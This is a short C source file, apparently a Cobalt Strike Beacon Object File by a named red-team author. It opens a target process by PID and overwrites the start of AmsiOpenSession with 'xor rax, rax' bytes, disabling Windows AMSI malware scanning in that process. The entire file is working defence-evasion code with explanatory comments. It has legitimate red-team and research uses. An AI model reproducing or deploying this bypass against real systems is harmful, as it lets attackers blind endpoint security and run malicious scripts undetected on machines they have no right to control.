#include <windows.h>
#include "beacon.h"

// Author: Bobby Cooke (@0xBoku) // SpiderLabs // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

void patchAmsiOpenSession(int pid) {
	HANDLE hProc = NULL;
	SIZE_T bytesWritten;
	// https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	// HANDLE OpenProcess(
	// 	 DWORD dwDesiredAccess, - The access to the process object. 
	// 	 BOOL  bInheritHandle,  - If this value is TRUE, processes created by this process will inherit the handle.
	// 	 DWORD dwProcessId      - The identifier of the local process to be opened.
	// );
	// https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
	//   PROCESS_VM_OPERATION (0x0008)  Required to perform an operation on the address space of a process 
	//   PROCESS_VM_WRITE     (0x0020)  Required to write to memory in a process using WriteProcessMemory.
	// Takes the PID supplied and opens a handle to that process
	hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
	// Loads AMSI.DLL into the beacons memory and resolves the address of the AmsiOpenSession symbol
	// The addresses of the symbols for DLLs are the same across all processes 
	PVOID amsiOpenSessAddr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("amsi.dll"), "AmsiOpenSession");
	// This is the payload we will inject into the start of the AmsiOpenSession symbol within the target process
	unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
	// Write the AMSI bypass payload to the remote process
	BOOL success = KERNEL32$WriteProcessMemory(hProc, amsiOpenSessAddr, (PVOID)amsibypass, sizeof(amsibypass), &bytesWritten);
	KERNEL32$CloseHandle(hProc);
	if (success) {
		BeaconPrintf(CALLBACK_OUTPUT, "Success - Patched AMSI.AmsiOpenSession in remote process: PID:%d",pid);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "Fail - Could not patch AMSI.AmsiOpenSession in remote process: PID:%d", pid);
	}
}
void go(char * args, int len) {
    datap parser;
    DWORD pid;
    BeaconDataParse(&parser, args, len);
    pid = BeaconDataInt(&parser);
    BeaconPrintf(CALLBACK_OUTPUT, "Attempting to patch AMSI in remote process with PID: %d", pid);
    patchAmsiOpenSession(pid);
}
